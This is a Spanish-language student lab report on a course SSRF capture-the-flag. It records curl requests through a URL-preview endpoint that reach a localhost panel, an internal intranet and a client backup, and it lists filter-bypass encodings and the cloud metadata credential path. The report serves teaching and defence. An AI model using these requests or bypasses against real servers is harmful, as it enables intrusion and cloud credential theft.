# Informe — Lab Extra SSRF (Server-Side Request Forgery)

**Grupo:** 05 · **Integrantes:** Magni, Gastón (@nosungam) · Mosconi, Ignacio
(@ignamosconi) · Presuttari, Matías (@matiaspresuttari) · Terreno, Valentino
(@vterreno)

**Declaración de uso de IA:** usamos un asistente de IA (Claude) para ordenar la
redacción del informe y revisar la claridad de las respuestas de análisis
(P1–P5) y del research. **La explotación la hicimos nosotros** contra los
contenedores de la cátedra: cada comando de este informe fue ejecutado desde la
consola del atacante (`make shell`) y su salida está archivada sin editar en
`evidencia/salidas/`. Validamos todo lo que la IA sugirió contrastándolo contra
la salida real del laboratorio (las flags, los mensajes de error de conexión y
el diagrama de red del enunciado) y contra las fuentes citadas en `research.md`.
No pegamos flags que no hayamos capturado: las tres salen de `./ctf status
extra` en ✓.

---

## 1. Cadena de explotación

Todos los comandos se corren desde la consola del atacante (`make shell`), que
está en `labnet`. La intranet vive en `internalnet`, una red Docker marcada
`internal: true`: **no hay ruta directa** desde el atacante. Lo comprobamos
antes de empezar (evidencia `salidas/r0_alcance.txt`):

```
$ curl -s --max-time 5 http://phantomcorp/            # portal publico: responde
$ curl -s --max-time 4 http://phantomcorp-intra/      # intranet:
exit=6                                                # (curl: could not resolve host / no route)
```

El portal público expone en la home una **herramienta de previsualización de
URLs** para empleados: `GET /preview?url=<URL>`. El servidor fetchea esa URL
**desde su posición de red** y nos devuelve el contenido. No valida el destino:
no hay allowlist, no bloquea `localhost` ni IPs internas. Eso es SSRF
(CWE-918). Ese `/preview` es el único componente que usamos en los tres retos.

### R1 — Panel interno en localhost · `FLAG{ssrf_localhost_panel_interno}`

**Descubrimiento de la funcionalidad.** La home del portal (`curl -s
http://phantomcorp/`) muestra el formulario `action="/preview" method="get"`
con el campo `url`. Una funcionalidad que "recibe una URL y la fetchea desde el
servidor" es el candidato clásico a SSRF.

**Encontrar el puerto del panel.** El server anuncia que "la previsualización
la genera el servidor", así que apuntamos el `/preview` a su propio
`127.0.0.1`. Usamos los **mensajes de error** como oráculo de escaneo de
puertos: le pedimos al server que fetchee distintos puertos de su loopback y
miramos qué devuelve (evidencia `salidas/r1_localhost.txt`):

```
$ curl -s 'http://phantomcorp/preview?url=http://127.0.0.1:9001/'
No pude traer http://127.0.0.1:9001/: <urlopen error [Errno 111] Connection refused>

$ curl -s 'http://phantomcorp/preview?url=http://127.0.0.1:8080/'
No pude traer http://127.0.0.1:8080/: <urlopen error [Errno 111] Connection refused>

$ curl -s 'http://phantomcorp/preview?url=http://127.0.0.1:9000/'
<h3>Previsualizacion de http://127.0.0.1:9000/</h3><hr><!doctype html><html>...
<h2>PhantomCorp — Panel interno (solo localhost)</h2>
<p>Deploy key: <b>FLAG{ssrf_localhost_panel_interno}</b></p>
```

`9001` y `8080` responden `Connection refused` (puerto cerrado); `9000`
devuelve HTML con `HTTP 200` (puerto abierto). Ahí estaba el panel de
administración que "solo escucha en localhost por seguridad" — con la deploy
key a la vista. **"Solo localhost" dejó de ser una defensa: el SSRF *es*
localhost.**

### R2 — Intranet en la red interna · `FLAG{ssrf_intranet_descubierta}`

**Deducción del nombre interno.** El enunciado nos dice que existe una
intranet. Los hosts internos de PhantomCorp siguen el mismo patrón de
nomenclatura que venimos viendo (Lab 08): el host público es `phantomcorp` y el
interno es `phantomcorp-intra`. No lo alcanzamos nosotros (dio `exit=6` arriba),
así que le pedimos al server que lo fetchee por nosotros
(`salidas/r2_intranet.txt`):

```
$ curl -s 'http://phantomcorp/preview?url=http://phantomcorp-intra/'
<h3>Previsualizacion de http://phantomcorp-intra/</h3><hr><h1>Intranet PhantomCorp</h1>
<p><b>USO INTERNO.</b> Si la estás viendo desde afuera, avisá a Seguridad.</p>
<p>Host: <b>FLAG{ssrf_intranet_descubierta}</b></p>
<ul>
  <li><a href="/backups/clientes.json">backup de clientes (temporal, borrar!)</a></li>
  <li><a href="/salud">estado del servicio</a></li>
</ul>
```

El server (que **sí** está en `internalnet`) resolvió y fetcheó la intranet, y
nos devolvió su home — incluyendo la lista de enlaces internos. La segmentación
de red quedó anulada porque un host de la DMZ fetchea URLs arbitrarias.

### R3 — Exfiltración del backup · `FLAG{ssrf_backup_clientes}`

**Recorrido.** La home de la intranet (R2) nos dio el inventario de rutas:
`/backups/clientes.json` ("temporal, borrar!") y `/salud`. Seguimos el enlace
del backup, siempre a través del `/preview` (`salidas/r3_backup.txt`):

```
$ curl -s 'http://phantomcorp/preview?url=http://phantomcorp-intra/backups/clientes.json'
<h3>Previsualizacion de http://phantomcorp-intra/backups/clientes.json</h3><hr>{
  "_aviso": "backup temporal pre-migracion. NO deberia ser accesible.",
  "clientes": [
    {"id": 1, "empresa": "Aconcagua SRL", "cuit": "30-70998877-1"},
    {"id": 2, "empresa": "Comechingones SA", "cuit": "30-71554433-6"}
  ],
  "integridad": "FLAG{ssrf_backup_clientes}"
}
```

**Datos sensibles que acompañaban a la flag.** Un backup de clientes con datos
de identificación fiscal: razón social y **CUIT** de dos empresas (Aconcagua SRL
— 30-70998877-1; Comechingones SA — 30-71554433-6). Es información de terceros
que nunca debió ser alcanzable desde fuera de la red interna.

## 2. Evidencia de progreso

Salida completa de `./ctf status extra` (archivada en
`evidencia/salidas/status_extra.txt`):

```
  ╭────────────────────────────────────────────────────────────╮
  │                    PROGRESO · LAB extra                      │
  ╰────────────────────────────────────────────────────────────╯

   ✓  R1     El server fetchea por vos: panel interno en localhost
   ✓  R2     Descubrir la intranet en la red interna
   ✓  R3     Exfiltrar datos sensibles a traves del SSRF

  ██████████████████████████████  3/3 (100%)

[ OK ] ¡Lab extra COMPLETO! Ponete las pilas con la próxima unidad.
```

## 3. Preguntas de análisis

### P1 — ¿Por qué "la intranet no es alcanzable desde afuera" dejó de ser cierto?

El diagrama del lab:

```
   atacante ──labnet──>  phantomcorp (web :80)  ──internalnet──>  phantomcorp-intra
        │                        │                                        ▲
        └─────────── ✗ NO hay ruta directa ──────────────────────────────┘
```

La frase es cierta **a nivel de red**: el atacante vive en `labnet` y la
intranet en `internalnet` (`internal: true`), sin ruta entre ellas — por eso el
`curl` directo da `exit=6`. Pero `phantomcorp` tiene **una pata en cada red**
(`labnet` *y* `internalnet`). El componente que hizo alcanzable la intranet es
el `/preview`: una funcionalidad de la DMZ que fetchea URLs arbitrarias **desde
la posición de red del servidor**. El atacante no cruza el perímetro; lo cruza
el servidor por él. El límite dejó de ser la red y pasó a ser "¿qué puede pedir
el servidor?" — que, sin validación, es *cualquier cosa*.

### P2 — El oráculo de escaneo de puertos (los mensajes de error)

En R1 distinguimos puerto cerrado de abierto por lo que devolvía el `/preview`:

- **Puerto cerrado** (`:9001`, `:8080`): `HTTP 502` + `<urlopen error [Errno
  111] Connection refused>`. El SO del server rechazó la conexión al instante.
- **Puerto abierto** (`:9000`): `HTTP 200` con el cuerpo HTML del servicio.

Esa diferencia observable (error de conexión vs. contenido; y también el tiempo
de respuesta — un *refused* es inmediato, un puerto filtrado daría *timeout*) es
un **oráculo**: una señal que responde "sí/no" a la pregunta "¿hay algo
escuchando en este puerto?". Repitiéndola sobre un rango de puertos convertimos
el `/preview` en un **escáner de puertos de la red interna del servidor**, sin
tener nosotros ninguna ruta a esa red. El server filtra texto de la *respuesta*
pero sus propios mensajes de error ya filtran información de la *topología
interna*. Es el mismo principio que una inyección SQL basada en errores o en
tiempo: no necesitás que te devuelvan el dato, alcanza con que el sistema se
comporte distinto según la respuesta.

### P3 — Hallazgo profesional (R3)

> **Título:** Exposición de backup de clientes vía SSRF en el previsualizador de
> URLs del portal público.
>
> **Activo afectado:** Intranet corporativa `phantomcorp-intra`
> (`internalnet`), recurso `/backups/clientes.json`. Alcanzada a través del
> portal público `phantomcorp` (`GET /preview`).
>
> **Vector:** SSRF (CWE-918 / OWASP A10:2021). El endpoint
> `GET /preview?url=` fetchea URLs provistas por el usuario sin validar el
> destino (sin allowlist de hosts, sin bloqueo de IPs privadas/loopback). Un
> atacante no autenticado en la red del portal fuerza al servidor —que tiene
> interfaz en la red interna— a solicitar recursos internos y le devuelve la
> respuesta.
>
> **Impacto:** Alto. Divulgación de información de terceros: un backup
> pre-migración con razón social y CUIT de clientes (Aconcagua SRL —
> 30-70998877-1; Comechingones SA — 30-71554433-6). Viola confidencialidad de
> datos de clientes y la segmentación de red que se asumía como control. En un
> entorno real implicaría notificación por normativa de datos personales
> (en Argentina, Ley 25.326).
>
> **Evidencia:** petición
> `GET http://phantomcorp/preview?url=http://phantomcorp-intra/backups/clientes.json`
> devolvió `HTTP 200` con el JSON completo del backup. Transcripción en
> `evidencia/salidas/r3_backup.txt`; backup identificado previamente en la home
> de la intranet (`evidencia/salidas/r2_intranet.txt`).

### P4 — Tres mitigaciones para `/preview`, de mejor a peor

1. **Rediseñar: no fetchear destinos arbitrarios. Allowlist estricta de
   destinos + salida por un egress proxy.** Si el preview solo necesita sitios
   públicos conocidos, se define una lista blanca de dominios/esquemas
   permitidos y todo pedido sale por un proxy de egreso que solo rutea a
   Internet, sin acceso a `internalnet` ni a `127.0.0.1`. *Limitación:* exige
   saber de antemano qué destinos son legítimos; si el caso de uso es "cualquier
   URL pública", la allowlist se vuelve inmanejable y hay que apoyarse en el
   control de egreso (que es lo que de verdad contiene el daño).

2. **Validar el destino resolviendo la IP y bloqueando rangos
   privados/loopback/link-local — después de resolver DNS y en cada redirect.**
   Resolver el host, rechazar `127.0.0.0/8`, `10/8`, `172.16/12`, `192.168/16`,
   `169.254/16` (metadata), `::1`, etc., y **reusar esa misma IP validada para
   conectar** (no re-resolver). *Limitación:* es fácil hacerlo mal. Hay que
   cubrir las codificaciones alternativas de IP y los bypass de nombre, y sobre
   todo el **DNS rebinding**: un dominio que resuelve a una IP pública en la
   validación y a `127.0.0.1` en la conexión. Si validás el string o resolvés
   dos veces, se te escapa.

3. **Filtrar strings "peligrosos" en la URL (bloquear `localhost`, `127.0.0.1`,
   `internal`…).** Es la peor: da sensación de seguridad y no para casi nada.
   Se evade con `http://127.1/`, con la IP en **decimal**
   `http://2130706433/` (= 127.0.0.1), octal/hex, IPv6 `http://[::1]/`,
   `http://0/`, un dominio atacante que **resuelve a 127.0.0.1**, o redirects
   `3xx` hacia un destino interno. El filtrado de strings no entiende de
   resolución de nombres ni de redirecciones; por eso nunca alcanza por sí
   solo.

> En resumen: la defensa real es de arquitectura (no dejar que el servicio
> alcance la red interna / metadata — egress control + segmentación), no de
> parseo de la URL.

### P5 — Conexión con la nube: el metadata service `169.254.169.254`

Es un endpoint **link-local** (IP `169.254.169.254`, no ruteable fuera de la
instancia) que las nubes (AWS IMDS, GCP, Azure) exponen a cada VM para que
consulte datos sobre sí misma: su configuración, user-data y, lo crítico, las
**credenciales temporales del rol IAM** asociado a la instancia. Está pensado
para que lo consulte *la propia instancia*, sin autenticación, confiando en que
"si podés hablarle, es porque sos la instancia".

Un SSRF en una app cloud es mucho más grave que en este lab porque permite que
el atacante le pida al servidor `http://169.254.169.254/latest/meta-data/iam/
security-credentials/<rol>` y se lleve esas credenciales temporales. Con ellas
actúa como la aplicación contra toda la cuenta cloud (p. ej. leer buckets S3):
deja de ser "leí una intranet" y pasa a **robo de credenciales y compromiso de
la cuenta**. Es exactamente lo que le pasó a Capital One en 2019 (ver
`research.md`). El paralelo con R1 es directo: en R1 el server se pedía a sí
mismo (`127.0.0.1`) un panel que "solo escuchaba en localhost"; el metadata
service es ese mismo "solo yo me hablo a mí mismo" llevado a la nube — y la
mitigación de fondo es la misma idea que IMDSv2.

## 4. Conclusión (resumen ejecutivo para el CTO de PhantomCorp)

La intranet que daban por inalcanzable "porque está en una red interna" quedó
completamente expuesta desde Internet a través de una sola funcionalidad del
portal público: el previsualizador de URLs. Sin autenticarnos y sin explotar
ningún servicio interno, conseguimos que el propio servidor nos leyera un panel
de administración que "solo escucha en localhost", descubriera la intranet y
nos entregara un backup con datos fiscales de clientes. La causa no es un bug
aislado sino una suposición equivocada de arquitectura: *confiar en la ubicación
de red como control de acceso*. Mientras un servicio de la DMZ pueda pedir URLs
arbitrarias, el perímetro no existe. La corrección prioritaria es cortar el
egreso de ese servicio hacia la red interna y el metadata service, y mover el
control de "¿de dónde viene el pedido?" a "¿qué está autorizado a pedir este
servicio?".
